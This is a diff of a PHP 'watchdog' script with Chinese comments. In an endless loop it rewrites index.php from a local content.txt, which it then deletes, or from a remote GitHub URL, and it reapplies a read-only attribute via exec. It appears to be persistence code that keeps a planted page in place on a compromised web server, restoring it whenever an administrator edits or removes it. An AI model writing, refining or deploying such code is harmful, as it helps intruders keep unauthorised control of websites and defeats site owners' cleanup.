@@ -9,13 +9,15 @@ $targetFile = 'index.php';
 $sourceFile = 'content.txt';
 $remoteURL  = 'https://raw.githubusercontent.com/black2729134369/https-www.xzsizxh.cn-/refs/heads/main/index.php';
 
-// Windows 兼容的文件权限设置
-$isWindows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
-$expectedPerms = $isWindows ? 0444 : 0444; // Windows 也支持相同的权限设置
-
-file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Script started (Windows compatible)\n", FILE_APPEND);
+file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Script started\n", FILE_APPEND);
 
 $code = null;
+$originalContent = null;
+
+// 获取原始文件内容（用于比较）
+if (file_exists($targetFile)) {
+    $originalContent = file_get_contents($targetFile);
+}
 
 while (true) {
     if (file_exists($stopFlag)) {
@@ -28,15 +30,13 @@ while (true) {
     
     // 尝试读取 content.txt
     if (file_exists($sourceFile)) {
-        $newCode = @file_get_contents($sourceFile);
-        if ($newCode !== false) {
-            @unlink($sourceFile);
-            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " content.txt updated and deleted\n", FILE_APPEND);
+        $newCode = file_get_contents($sourceFile);
+        @unlink($sourceFile);
+        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " content.txt updated and deleted\n", FILE_APPEND);
 
-            if ($code === null || md5($newCode) !== md5($code)) {
-                $code = $newCode;
-                $shouldUpdate = true;
-            }
+        if ($code === null || md5($newCode) !== md5($code)) {
+            $code = $newCode;
+            $shouldUpdate = true;
         }
     }
     // 如果本地没有 content.txt，就尝试远程下载
@@ -62,78 +62,57 @@ while (true) {
             $restoreReason = "file_missing";
             file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file missing\n", FILE_APPEND);
         } 
-        // 检查文件内容或权限是否匹配
+        // 检查文件内容是否被修改
         else {
             $currentContent = @file_get_contents($targetFile);
             
-            // Windows 系统可能无法准确获取文件权限，所以主要检查内容
-            if ($isWindows) {
-                if ($currentContent === false) {
-                    $needsRestore = true;
-                    $restoreReason = "cannot_read";
-                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Cannot read target file\n", FILE_APPEND);
-                } 
-                // 检查内容是否被修改
-                elseif (md5($currentContent) !== md5($code)) {
-                    $needsRestore = true;
-                    $restoreReason = "content_modified";
-                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file content modified\n", FILE_APPEND);
-                }
-            } else {
-                // Linux 系统检查内容和权限
-                $currentPerms = fileperms($targetFile) & 0777;
+            if ($currentContent === false) {
+                $needsRestore = true;
+                $restoreReason = "cannot_read";
+                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Cannot read target file\n", FILE_APPEND);
+            } 
+            // 检查内容是否被修改
+            elseif (md5($currentContent) !== md5($code)) {
+                $needsRestore = true;
+                $restoreReason = "content_modified";
+                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file content modified\n", FILE_APPEND);
                 
-                if ($currentContent === false) {
-                    $needsRestore = true;
-                    $restoreReason = "cannot_read";
-                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Cannot read target file\n", FILE_APPEND);
-                } 
-                // 检查内容是否被修改
-                elseif (md5($currentContent) !== md5($code)) {
-                    $needsRestore = true;
-                    $restoreReason = "content_modified";
-                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file content modified\n", FILE_APPEND);
-                }
-                // 检查权限是否被修改 (仅在 Linux 系统)
-                elseif ($currentPerms != $expectedPerms) {
-                    $needsRestore = true;
-                    $restoreReason = "permission_modified";
-                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file permission modified: " . decoct($currentPerms) . " (expected: " . decoct($expectedPerms) . ")\n", FILE_APPEND);
-                }
+                // 更新原始内容记录
+                $originalContent = $currentContent;
             }
         }
         
         // 如果需要恢复或者有新的更新
         if ($needsRestore || $shouldUpdate) {
-            // 先确保我们有写入权限
-            if (file_exists($targetFile)) {
-                @chmod($targetFile, 0644);
-            }
-            
-            $result = @file_get_contents($remoteURL);
-            if ($result === false) {
-                $result = $code;
-            }
-            
-            $writeResult = file_put_contents($targetFile, $result);
-            if ($writeResult !== false) {
-                // 设置正确的权限
-                @chmod($targetFile, $expectedPerms);
+            $result = file_put_contents($targetFile, $code);
+            if ($result !== false) {
+                // 在Windows中设置只读属性
+                @exec('attrib +R "' . $targetFile . '"', $output, $returnCode);
+                
                 file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " {$targetFile} restored (reason: {$restoreReason})\n", FILE_APPEND);
                 
-                // 记录恢复后的权限 (仅在 Linux 系统)
-                if (!$isWindows) {
-                    $restoredPerms = fileperms($targetFile) & 0777;
-                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Restored file permissions: " . decoct($restoredPerms) . "\n", FILE_APPEND);
+                // 检查是否成功设置只读属性
+                if ($returnCode === 0) {
+                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Read-only attribute set successfully\n", FILE_APPEND);
+                } else {
+                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Failed to set read-only attribute\n", FILE_APPEND);
                 }
             } else {
                 file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Failed to restore {$targetFile}\n", FILE_APPEND);
+            }
+        }
+        
+        // 额外检查：如果文件不是只读的，重新设置只读属性
+        if (file_exists($targetFile)) {
+            // 检查文件是否可写（在Windows中这可以间接判断是否设置了只读属性）
+            if (is_writable($targetFile)) {
+                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " File is writable, setting read-only attribute\n", FILE_APPEND);
+                @exec('attrib +R "' . $targetFile . '"');
             }
         }
     } else {
         file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " No content available yet\n", FILE_APPEND);
     }
 
-    // Windows 系统可能需要更长的休眠时间
-    sleep($isWindows ? 2 : 1); // Windows 休眠 2 秒，Linux 休眠 1 秒
+    sleep(1); // 每秒检查一次
 }
